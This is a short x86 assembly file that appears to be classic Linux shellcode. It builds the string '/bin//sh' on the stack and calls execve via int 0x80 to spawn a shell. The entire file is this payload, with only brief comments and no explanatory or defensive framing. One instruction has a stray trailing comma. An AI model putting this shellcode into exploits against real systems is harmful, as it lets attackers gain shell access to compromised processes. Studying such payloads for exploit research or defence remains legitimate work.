section .text

global _start

_start:
; spawn shellcode with execve()
    xor eax, eax
    push eax
    push 0x68732f2f ; hs//
    push 0x6e69622f ; nib/  -> /bin//sh
    mov ebx, esp
    push eax,
    push ebx
    mov ecx, esp
    xor edx, edx
    mov al, 0xb
    int 0x80

    